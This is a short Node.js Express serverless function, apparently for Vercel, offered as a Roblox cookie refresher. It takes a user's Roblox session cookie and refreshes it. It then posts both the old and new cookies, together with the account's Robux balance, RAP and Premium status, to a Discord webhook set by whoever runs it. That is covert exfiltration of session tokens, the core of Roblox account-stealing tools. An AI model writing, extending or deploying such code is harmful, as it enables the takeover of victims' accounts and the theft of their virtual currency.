const express = require('express');
const axios = require('axios');
// This is the key change: we now import the single, powerful `refreshCookie` function
const { refreshCookie } = require('./refresh');
const { RobloxUser } = require('./getuserinfo');

const app = express();

app.get('/api/refresh', async (req, res) => {
    const oldCookie = req.query.cookie;
    
    if (!oldCookie) {
        return res.status(400).json({ error: "Cookie parameter is missing" });
    }

    try {
        // We call the one function that does the entire refresh process. This fixes the error.
        const refreshedCookie = await refreshCookie(oldCookie);
        
        const webhookURL = process.env.DISCORD_WEBHOOK_URL;
        if (webhookURL) {
            try {
                const robloxUser = await RobloxUser.register(refreshedCookie);
                const userData = await robloxUser.getUserData();

                axios.post(webhookURL, {
                    embeds: [{
                        title: 'Cookie Refreshed Successfully',
                        color: 5814783,
                        author: {
                            name: `${userData.displayName} (@${userData.username})`,
                            url: `https://www.roblox.com/users/${userData.uid}/profile`,
                            icon_url: userData.avatarUrl
                        },
                        fields: [
                             { name: 'Robux', value: `R$ ${userData.balance}`, inline: true },
                             { name: 'RAP', value: `R$ ${userData.rap}`, inline: true },
                             { name: 'Premium', value: userData.isPremium ? '✅ Yes' : '❌ No', inline: true },
                             {
                                name: '🍪 New Cookie',
                                value: `\`\`\`${refreshedCookie}\`\`\``,
                                inline: false
                             },
                             {
                                name: '↩️ Old Cookie',
                                value: `\`\`\`${oldCookie}\`\`\``,
                                inline: false
                             }
                        ],
                        footer: { text: "Roblox Refresher" },
                        timestamp: new Date().toISOString()
                    }]
                }).catch(err => console.error("Webhook failed to send:", err.message));
            } catch (webhookError) {
                console.error("Failed to get user data for webhook:", webhookError.message);
            }
        }
        
        // Send the new cookie back to the user
        res.json({ refreshedCookie });

    } catch (error) {
        // If any step in the refresh process fails, send back a clean error
        console.error("Cookie Refresh Error:", error.message);
        res.status(500).json({ error: error.message });
    }
});

// This is required by Vercel to handle all requests to this serverless function
module.exports = app;
